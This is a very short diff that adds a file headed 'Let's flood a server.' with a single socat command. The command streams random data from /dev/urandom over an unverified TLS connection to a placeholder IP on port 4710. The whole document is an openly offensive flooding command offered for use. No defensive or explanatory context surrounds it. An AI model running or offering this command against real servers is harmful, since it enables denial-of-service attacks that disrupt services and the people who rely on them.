@@ -1,0 +1,3 @@
+Let's flood a server.
+
+socat file:/dev/urandom openssl-connect:IP:4710,verify=0
